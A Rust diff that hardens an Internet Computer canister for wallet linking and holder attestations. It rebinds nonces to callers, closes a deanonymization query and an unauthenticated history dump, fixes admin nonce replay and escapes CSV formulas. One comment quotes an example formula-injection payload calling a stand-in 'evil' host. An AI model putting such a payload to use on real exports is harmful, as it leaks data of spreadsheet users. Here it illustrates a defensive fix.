@@ -32,8 +32,12 @@ const MEM_ADMIN_PRINCIPAL: MemoryId = MemoryId::new(10);
 const ADMIN_KEY: u8 = 0;
 
 thread_local! {
+    // 1 page (64 KiB) buckets, not the 8 MiB default: 11 memory regions would
+    // otherwise reserve 88 MiB of empty stable memory on first write, which is
+    // pure idle-cycle burn. Only takes effect on a *fresh* install -- an existing
+    // canister keeps whatever bucket size its stored header records.
     static MM: RefCell<MemoryManager<DefaultMemoryImpl>> =
-        RefCell::new(MemoryManager::init(DefaultMemoryImpl::default()));
+        RefCell::new(MemoryManager::init_with_bucket_size(DefaultMemoryImpl::default(), 1));
 
     static WALLET_TO_PRINCIPAL: RefCell<StableBTreeMap<EthAddress, PrincipalVal, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_WALLET_TO_PRINCIPAL))));
@@ -53,13 +57,13 @@ thread_local! {
     static WALLET_REVISIONS: RefCell<StableBTreeMap<AddrRevKey, WalletAttestation, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_WALLET_REVISIONS))));
 
-    static LINK_NONCES: RefCell<StableBTreeMap<EthAddress, NonceEntry, Mem>> =
+    static LINK_NONCES: RefCell<StableBTreeMap<PrincipalVal, NonceEntry, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_LINK_NONCES))));
 
-    static ATTEST_NONCES: RefCell<StableBTreeMap<EthAddress, NonceEntry, Mem>> =
+    static ATTEST_NONCES: RefCell<StableBTreeMap<PrincipalVal, NonceEntry, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_ATTEST_NONCES))));
 
-    static ADMIN_NONCES: RefCell<StableBTreeMap<EthAddress, NonceEntry, Mem>> =
+    static ADMIN_NONCES: RefCell<StableBTreeMap<PrincipalVal, NonceEntry, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_ADMIN_NONCES))));
 
     static ADMIN_ETH: RefCell<StableBTreeMap<u8, EthAddress, Mem>> =
@@ -67,6 +71,10 @@ thread_local! {
 
     static ADMIN_PRINCIPAL: RefCell<StableBTreeMap<u8, PrincipalVal, Mem>> =
         RefCell::new(StableBTreeMap::init(MM.with(|m| m.borrow().get(MEM_ADMIN_PRINCIPAL))));
+
+    // Rotating start point for the expired-nonce sweep. Heap only -- it resets on
+    // upgrade, which costs nothing but a single restarted sweep pass.
+    static SWEEP_CURSOR: RefCell<Option<PrincipalVal>> = const { RefCell::new(None) };
 }
 
 // `k256` and friends pull in `getrandom` but we never actually invoke its
@@ -137,21 +145,87 @@ fn nonce_expired(entry: &NonceEntry, ttl_ns: u64) -> bool {
     now_ns().saturating_sub(entry.issued_at_ns) > ttl_ns
 }
 
+/// How many entries one sweep pass looks at. ponytail: bounded linear scan from a
+/// rotating cursor -- reclaims faster than a single caller can insert, since each
+/// caller holds at most one row per map. Swap for a time-ordered index only if
+/// the nonce maps ever get big enough for a full pass to matter.
+const SWEEP_BATCH: usize = 20;
+
+fn sweep_expired(map: &RefCell<StableBTreeMap<PrincipalVal, NonceEntry, Mem>>, ttl_ns: u64) {
+    let start = SWEEP_CURSOR.with(|c| c.borrow().clone());
+    let batch: Vec<(PrincipalVal, NonceEntry)> = {
+        let m = map.borrow();
+        match start {
+            Some(k) => m.range(k..).take(SWEEP_BATCH).collect(),
+            None => m.iter().take(SWEEP_BATCH).collect(),
+        }
+    };
+    // Short batch means we hit the end of the map: wrap the cursor.
+    let next = if batch.len() < SWEEP_BATCH { None } else { batch.last().map(|(k, _)| k.clone()) };
+    SWEEP_CURSOR.with(|c| *c.borrow_mut() = next);
+
+    let mut m = map.borrow_mut();
+    for (k, v) in batch {
+        if nonce_expired(&v, ttl_ns) {
+            m.remove(&k);
+        }
+    }
+}
+
+/// Issue a fresh nonce for `caller`, overwriting any previous one. Keyed by the
+/// caller, so one principal can never invalidate another's in-flight nonce, and
+/// can never hold more than one row per map.
+async fn issue_nonce(
+    map: &'static std::thread::LocalKey<RefCell<StableBTreeMap<PrincipalVal, NonceEntry, Mem>>>,
+    caller: Principal,
+    addr: EthAddress,
+    ttl_ns: u64,
+) -> Result<String, String> {
+    let nonce = nonce::fresh_uuid_v4().await?;
+    let entry = NonceEntry { nonce: nonce.clone(), addr, issued_at_ns: now_ns() };
+    map.with(|m| {
+        sweep_expired(m, ttl_ns);
+        m.borrow_mut().insert(PrincipalVal(caller), entry);
+    });
+    Ok(nonce)
+}
+
 fn nonexpired_nonce(
-    map_key: &EthAddress,
+    caller: Principal,
+    addr: &EthAddress,
     nonce: &str,
     ttl_ns: u64,
-    map: &mut StableBTreeMap<EthAddress, NonceEntry, Mem>,
+    map: &mut StableBTreeMap<PrincipalVal, NonceEntry, Mem>,
 ) -> Result<(), String> {
-    let entry = map.get(map_key).ok_or("no outstanding nonce; request one first")?;
+    let key = PrincipalVal(caller);
+    let entry = map.get(&key).ok_or("no outstanding nonce; request one first")?;
     if entry.nonce != nonce {
         return Err("nonce mismatch".into());
+    }
+    if entry.addr != *addr {
+        return Err("nonce was issued for a different wallet address".into());
     }
     if nonce_expired(&entry, ttl_ns) {
         return Err("nonce expired".into());
     }
-    map.remove(map_key);
+    map.remove(&key);
     Ok(())
+}
+
+// --- Prefix range bounds (B1) ------------------------------------------------
+// All three composite keys encode their prefix first, so one principal's (or one
+// address's) rows are contiguous and these bounds select exactly them.
+
+fn wallets_of(p: Principal) -> std::ops::RangeInclusive<PrincipalAddrKey> {
+    PrincipalAddrKey(p, EthAddress([0x00; 20]))..=PrincipalAddrKey(p, EthAddress([0xff; 20]))
+}
+
+fn holder_revs_of(p: Principal) -> std::ops::RangeInclusive<PrincipalRevKey> {
+    PrincipalRevKey(p, 0)..=PrincipalRevKey(p, u32::MAX)
+}
+
+fn wallet_revs_of(a: EthAddress) -> std::ops::RangeInclusive<AddrRevKey> {
+    AddrRevKey(a, 0)..=AddrRevKey(a, u32::MAX)
 }
 
 // ============================================================================
@@ -160,12 +234,9 @@ fn nonexpired_nonce(
 
 #[update]
 async fn get_link_nonce(eth_address: String) -> Result<String, String> {
-    let _ = caller_or_err()?;
+    let caller = caller_or_err()?;
     let addr = parse_addr(&eth_address)?;
-    let nonce = nonce::fresh_uuid_v4().await?;
-    let entry = NonceEntry { nonce: nonce.clone(), issued_at_ns: now_ns() };
-    LINK_NONCES.with(|m| m.borrow_mut().insert(addr, entry));
-    Ok(nonce)
+    issue_nonce(&LINK_NONCES, caller, addr, NONCE_TTL_NS).await
 }
 
 #[update]
@@ -184,12 +255,8 @@ fn link_wallet(payload: LinkPayload) -> Result<(), String> {
     }
 
     // Enforce the per-principal wallet cap.
-    let existing_count: u64 = PRINCIPAL_WALLETS.with(|m| {
-        m.borrow()
-            .iter()
-            .filter(|(k, _)| k.0 == caller)
-            .count() as u64
-    });
+    let existing_count: u64 =
+        PRINCIPAL_WALLETS.with(|m| m.borrow().range(wallets_of(caller)).count() as u64);
     if existing_count >= MAX_WALLETS_PER_PRINCIPAL {
         return Err(format!(
             "wallet cap reached: at most {MAX_WALLETS_PER_PRINCIPAL} wallets per Internet \
@@ -199,7 +266,7 @@ fn link_wallet(payload: LinkPayload) -> Result<(), String> {
 
     // Consume nonce.
     LINK_NONCES.with(|m| {
-        nonexpired_nonce(&addr, &payload.nonce, NONCE_TTL_NS, &mut m.borrow_mut())
+        nonexpired_nonce(caller, &addr, &payload.nonce, NONCE_TTL_NS, &mut m.borrow_mut())
     })?;
 
     // Rebuild canonical link message; recover address from signature.
@@ -228,10 +295,20 @@ fn link_wallet(payload: LinkPayload) -> Result<(), String> {
     Ok(())
 }
 
+/// Replaces the old `get_principal_for_wallet`, which returned the bound
+/// principal to anonymous callers -- a public wallet-address -> Internet-Identity
+/// deanonymization oracle. The link step only ever needed "is this taken?".
 #[query]
-fn get_principal_for_wallet(eth_address: String) -> Option<Principal> {
-    let addr = EthAddress::from_hex(&eth_address).ok()?;
-    WALLET_TO_PRINCIPAL.with(|m| m.borrow().get(&addr).map(|v| v.0))
+fn get_wallet_link_status(eth_address: String) -> WalletLinkStatus {
+    let addr = match EthAddress::from_hex(&eth_address) {
+        Ok(a) => a,
+        Err(_) => return WalletLinkStatus::Unlinked,
+    };
+    match WALLET_TO_PRINCIPAL.with(|m| m.borrow().get(&addr)) {
+        None => WalletLinkStatus::Unlinked,
+        Some(bound) if bound.0 == caller() => WalletLinkStatus::LinkedToCaller,
+        Some(_) => WalletLinkStatus::LinkedToOther,
+    }
 }
 
 #[query]
@@ -240,12 +317,8 @@ fn get_wallets_for_principal() -> Vec<String> {
         Ok(c) => c,
         Err(_) => return vec![],
     };
-    PRINCIPAL_WALLETS.with(|m| {
-        m.borrow()
-            .iter()
-            .filter_map(|(k, _)| if k.0 == caller { Some(k.1.to_lower_hex()) } else { None })
-            .collect()
-    })
+    PRINCIPAL_WALLETS
+        .with(|m| m.borrow().range(wallets_of(caller)).map(|(k, _)| k.1.to_lower_hex()).collect())
 }
 
 // ============================================================================
@@ -358,12 +431,8 @@ fn get_holder_revisions() -> Vec<HolderProfile> {
         Ok(c) => c,
         Err(_) => return vec![],
     };
-    HOLDER_REVISIONS.with(|m| {
-        m.borrow()
-            .iter()
-            .filter_map(|(k, v)| if k.0 == caller { Some(v) } else { None })
-            .collect()
-    })
+    HOLDER_REVISIONS
+        .with(|m| m.borrow().range(holder_revs_of(caller)).map(|(_, v)| v).collect())
 }
 
 // ============================================================================
@@ -372,12 +441,9 @@ fn get_holder_revisions() -> Vec<HolderProfile> {
 
 #[update]
 async fn get_attest_nonce(eth_address: String) -> Result<String, String> {
-    let _ = caller_or_err()?;
+    let caller = caller_or_err()?;
     let addr = parse_addr(&eth_address)?;
-    let nonce = nonce::fresh_uuid_v4().await?;
-    let entry = NonceEntry { nonce: nonce.clone(), issued_at_ns: now_ns() };
-    ATTEST_NONCES.with(|m| m.borrow_mut().insert(addr, entry));
-    Ok(nonce)
+    issue_nonce(&ATTEST_NONCES, caller, addr, NONCE_TTL_NS).await
 }
 
 fn ensure_acknowledged(holder: &HolderProfile) -> Result<(), String> {
@@ -531,7 +597,7 @@ fn submit_or_update(
 
     // Consume nonce.
     ATTEST_NONCES.with(|m| {
-        nonexpired_nonce(&addr, &payload.nonce, NONCE_TTL_NS, &mut m.borrow_mut())
+        nonexpired_nonce(caller, &addr, &payload.nonce, NONCE_TTL_NS, &mut m.borrow_mut())
     })?;
 
     // Rebuild canonical attestation message and recover signer.
@@ -584,12 +650,8 @@ fn get_my_wallets() -> Vec<WalletAttestation> {
         Ok(c) => c,
         Err(_) => return vec![],
     };
-    let addrs: Vec<EthAddress> = PRINCIPAL_WALLETS.with(|m| {
-        m.borrow()
-            .iter()
-            .filter_map(|(k, _)| if k.0 == caller { Some(k.1) } else { None })
-            .collect()
-    });
+    let addrs: Vec<EthAddress> =
+        PRINCIPAL_WALLETS.with(|m| m.borrow().range(wallets_of(caller)).map(|(k, _)| k.1).collect());
     let mut out = Vec::with_capacity(addrs.len());
     for a in addrs {
         if let Some(rev) = WALLET_LATEST.with(|m| m.borrow().get(&a)) {
@@ -601,50 +663,56 @@ fn get_my_wallets() -> Vec<WalletAttestation> {
     out
 }
 
+/// Only the principal this wallet is linked to may read its history. This used to
+/// be unauthenticated: since multiBTC holder addresses are public on-chain, anyone
+/// could walk the token holder list and dump every claimant's record.
 #[query]
-fn get_wallet_revisions(eth_address: String) -> Vec<WalletAttestation> {
-    let addr = match EthAddress::from_hex(&eth_address) {
-        Ok(a) => a,
-        Err(_) => return vec![],
-    };
-    WALLET_REVISIONS.with(|m| {
-        m.borrow()
-            .iter()
-            .filter_map(|(k, v)| if k.0 == addr { Some(v) } else { None })
-            .collect()
-    })
+fn get_wallet_revisions(eth_address: String) -> Result<Vec<WalletAttestation>, String> {
+    let caller = caller_or_err()?;
+    let addr = parse_addr(&eth_address)?;
+    let bound = WALLET_TO_PRINCIPAL
+        .with(|m| m.borrow().get(&addr))
+        .ok_or("wallet not linked")?;
+    if bound.0 != caller {
+        return Err("this wallet is linked to a different Internet Identity".into());
+    }
+    Ok(WALLET_REVISIONS.with(|m| m.borrow().range(wallet_revs_of(addr)).map(|(_, v)| v).collect()))
 }
 
 // ============================================================================
 // --- Public ---
 // ============================================================================
 
+/// ponytail: walks the two `*_LATEST` maps (one row per holder / per wallet)
+/// instead of every revision ever written. Still O(n) per call on a page that
+/// every visitor loads -- cache it in a StableCell invalidated by the four write
+/// paths if the registry ever gets big.
 #[query]
 fn get_public_stats() -> PublicStats {
     let mut s = PublicStats::default();
-    HOLDER_LATEST.with(|m| {
-        s.total_holders = m.borrow().len();
+    let latest_holders: Vec<HolderProfile> = HOLDER_LATEST.with(|m| {
+        let m = m.borrow();
+        s.total_holders = m.len();
+        m.iter()
+            .filter_map(|(p, rev)| {
+                HOLDER_REVISIONS.with(|hr| hr.borrow().get(&PrincipalRevKey(p.0, rev)))
+            })
+            .collect()
     });
-    HOLDER_REVISIONS.with(|m| {
-        for (k, v) in m.borrow().iter() {
-            let latest = HOLDER_LATEST.with(|hl| hl.borrow().get(&PrincipalVal(k.0)));
-            if Some(k.1) != latest {
-                continue;
-            }
-            if v.has_filed_pod {
-                s.pod_filed_holders += 1;
-            }
+    for h in latest_holders {
+        if h.has_filed_pod {
+            s.pod_filed_holders += 1;
         }
+    }
+    let latest_wallets: Vec<WalletAttestation> = WALLET_LATEST.with(|m| {
+        let m = m.borrow();
+        s.total_wallets = m.len();
+        m.iter()
+            .filter_map(|(a, rev)| WALLET_REVISIONS.with(|wr| wr.borrow().get(&AddrRevKey(a, rev))))
+            .collect()
     });
-    WALLET_LATEST.with(|m| {
-        s.total_wallets = m.borrow().len();
-    });
-    WALLET_REVISIONS.with(|m| {
-        for (k, v) in m.borrow().iter() {
-            let latest = WALLET_LATEST.with(|wl| wl.borrow().get(&k.0));
-            if Some(k.1) != latest {
-                continue;
-            }
+    {
+        for v in &latest_wallets {
             s.total_detected_eth = s.total_detected_eth.saturating_add(v.detected_eth);
             s.total_detected_bsc = s.total_detected_bsc.saturating_add(v.detected_bsc);
             s.total_detected_polygon =
@@ -667,7 +735,7 @@ fn get_public_stats() -> PublicStats {
                 s.last_submission_at_ns = v.submitted_at_ns;
             }
         }
-    });
+    }
     s
 }
 
@@ -693,10 +761,7 @@ async fn get_admin_nonce() -> Result<String, String> {
                 .into(),
         );
     }
-    let nonce = nonce::fresh_uuid_v4().await?;
-    let entry = NonceEntry { nonce: nonce.clone(), issued_at_ns: now_ns() };
-    ADMIN_NONCES.with(|m| m.borrow_mut().insert(current_admin_eth(), entry));
-    Ok(nonce)
+    issue_nonce(&ADMIN_NONCES, caller, current_admin_eth(), ADMIN_NONCE_TTL_NS).await
 }
 
 fn verify_admin_auth(auth: &AdminAuth) -> Result<(), String> {
@@ -707,15 +772,12 @@ fn verify_admin_auth(auth: &AdminAuth) -> Result<(), String> {
         return Err("admin principal mismatch".into());
     }
     let admin = current_admin_eth();
-    let entry = ADMIN_NONCES
-        .with(|m| m.borrow().get(&admin))
-        .ok_or("no outstanding admin nonce")?;
-    if entry.nonce != auth.nonce {
-        return Err("admin nonce mismatch".into());
-    }
-    if nonce_expired(&entry, ADMIN_NONCE_TTL_NS) {
-        return Err("admin nonce expired".into());
-    }
+    // Consumes the nonce. This only actually sticks because every caller of this
+    // helper is an #[update]; as #[query]s the removal was rolled back and the
+    // same (nonce, signature) pair stayed replayable for the whole TTL.
+    ADMIN_NONCES.with(|m| {
+        nonexpired_nonce(caller, &admin, &auth.nonce, ADMIN_NONCE_TTL_NS, &mut m.borrow_mut())
+    })?;
     let msg = message::build_admin_message(&auth.signed_at_iso, &auth.nonce);
     let recovered = verify::recover_eth_address(&msg, &auth.signature)?;
     if recovered != admin.0 {
@@ -727,7 +789,6 @@ fn verify_admin_auth(auth: &AdminAuth) -> Result<(), String> {
             admin_hex = hex::encode(admin.0)
         ));
     }
-    ADMIN_NONCES.with(|m| m.borrow_mut().remove(&admin));
     Ok(())
 }
 
@@ -773,7 +834,51 @@ fn set_admin_principal(principal: Option<Principal>) -> Result<(), String> {
     Ok(())
 }
 
-#[query]
+#[derive(candid::CandidType, serde::Deserialize, Clone, Default)]
+pub struct ResetCounts {
+    pub wallet_to_principal: u64,
+    pub principal_wallets: u64,
+    pub holder_latest: u64,
+    pub holder_revisions: u64,
+    pub wallet_latest: u64,
+    pub wallet_revisions: u64,
+    pub link_nonces: u64,
+    pub attest_nonces: u64,
+    pub admin_nonces: u64,
+}
+
+// Wipes all holder/wallet/nonce data. ADMIN_ETH and ADMIN_PRINCIPAL are
+// preserved. Controller-gated — irreversible.
+#[update]
+fn admin_reset_data() -> Result<ResetCounts, String> {
+    require_controller()?;
+    let mut counts = ResetCounts::default();
+
+    fn drain<K, V>(map: &RefCell<StableBTreeMap<K, V, Mem>>) -> u64
+    where
+        K: ic_stable_structures::Storable + Ord + Clone,
+        V: ic_stable_structures::Storable,
+    {
+        let mut m = map.borrow_mut();
+        let n = m.len();
+        m.clear_new();
+        n
+    }
+
+    WALLET_TO_PRINCIPAL.with(|m| counts.wallet_to_principal = drain(m));
+    PRINCIPAL_WALLETS.with(|m| counts.principal_wallets = drain(m));
+    HOLDER_LATEST.with(|m| counts.holder_latest = drain(m));
+    HOLDER_REVISIONS.with(|m| counts.holder_revisions = drain(m));
+    WALLET_LATEST.with(|m| counts.wallet_latest = drain(m));
+    WALLET_REVISIONS.with(|m| counts.wallet_revisions = drain(m));
+    LINK_NONCES.with(|m| counts.link_nonces = drain(m));
+    ATTEST_NONCES.with(|m| counts.attest_nonces = drain(m));
+    ADMIN_NONCES.with(|m| counts.admin_nonces = drain(m));
+
+    Ok(counts)
+}
+
+#[update]
 fn admin_list_holders(auth: AdminAuth) -> Result<Vec<HolderProfile>, String> {
     verify_admin_auth(&auth)?;
     let mut out = Vec::new();
@@ -797,7 +902,7 @@ pub struct AdminHolderBundle {
     pub wallet_revisions: Vec<(String, Vec<WalletAttestation>)>,
 }
 
-#[query]
+#[update]
 fn admin_list_holders_full(auth: AdminAuth) -> Result<Vec<AdminHolderBundle>, String> {
     verify_admin_auth(&auth)?;
     let mut out = Vec::new();
@@ -814,18 +919,10 @@ fn admin_list_holders_full(auth: AdminAuth) -> Result<Vec<AdminHolderBundle>, St
                 Some(h) => h,
                 None => continue,
             };
-        let holder_revisions: Vec<HolderProfile> = HOLDER_REVISIONS.with(|m| {
-            m.borrow()
-                .iter()
-                .filter_map(|(k, v)| if k.0 == p { Some(v) } else { None })
-                .collect()
-        });
-        let wallet_addrs: Vec<EthAddress> = PRINCIPAL_WALLETS.with(|m| {
-            m.borrow()
-                .iter()
-                .filter_map(|(k, _)| if k.0 == p { Some(k.1) } else { None })
-                .collect()
-        });
+        let holder_revisions: Vec<HolderProfile> =
+            HOLDER_REVISIONS.with(|m| m.borrow().range(holder_revs_of(p)).map(|(_, v)| v).collect());
+        let wallet_addrs: Vec<EthAddress> =
+            PRINCIPAL_WALLETS.with(|m| m.borrow().range(wallets_of(p)).map(|(k, _)| k.1).collect());
         let mut wallets = Vec::new();
         let mut wallet_revisions = Vec::new();
         for a in wallet_addrs {
@@ -836,12 +933,8 @@ fn admin_list_holders_full(auth: AdminAuth) -> Result<Vec<AdminHolderBundle>, St
                     wallets.push(att);
                 }
             }
-            let revs: Vec<WalletAttestation> = WALLET_REVISIONS.with(|m| {
-                m.borrow()
-                    .iter()
-                    .filter_map(|(k, v)| if k.0 == a { Some(v) } else { None })
-                    .collect()
-            });
+            let revs: Vec<WalletAttestation> =
+                WALLET_REVISIONS.with(|m| m.borrow().range(wallet_revs_of(a)).map(|(_, v)| v).collect());
             wallet_revisions.push((a.to_lower_hex(), revs));
         }
         out.push(AdminHolderBundle {
@@ -854,7 +947,7 @@ fn admin_list_holders_full(auth: AdminAuth) -> Result<Vec<AdminHolderBundle>, St
     Ok(out)
 }
 
-#[query]
+#[update]
 fn admin_export_csv(auth: AdminAuth) -> Result<String, String> {
     verify_admin_auth(&auth)?;
     let mut csv = String::new();
@@ -872,12 +965,8 @@ fn admin_export_csv(auth: AdminAuth) -> Result<String, String> {
                 Some(h) => h,
                 None => continue,
             };
-            let wallet_addrs: Vec<EthAddress> = PRINCIPAL_WALLETS.with(|m| {
-                m.borrow()
-                    .iter()
-                    .filter_map(|(k, _)| if k.0 == p.0 { Some(k.1) } else { None })
-                    .collect()
-            });
+            let wallet_addrs: Vec<EthAddress> = PRINCIPAL_WALLETS
+                .with(|m| m.borrow().range(wallets_of(p.0)).map(|(k, _)| k.1).collect());
             if wallet_addrs.is_empty() {
                 // Emit a row for the holder with no wallet info.
                 csv.push_str(&csv_row(&holder, None));
@@ -895,9 +984,15 @@ fn admin_export_csv(auth: AdminAuth) -> Result<String, String> {
     Ok(csv)
 }
 
+/// Quote a CSV field, and neutralise spreadsheet formula injection. This export
+/// is opened in Excel/Sheets by the liquidator, where a `legal_name` of
+/// `=HYPERLINK("http://evil/"&A1)` would otherwise execute on open.
 fn csv_q(s: &str) -> String {
-    let mut o = String::with_capacity(s.len() + 2);
+    let mut o = String::with_capacity(s.len() + 3);
     o.push('"');
+    if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        o.push('\'');
+    }
     for c in s.chars() {
         if c == '"' {
             o.push_str("\"\"");
@@ -975,3 +1070,4 @@ candid::export_service!();
 fn export_candid() -> String {
     __export_service()
 }
+
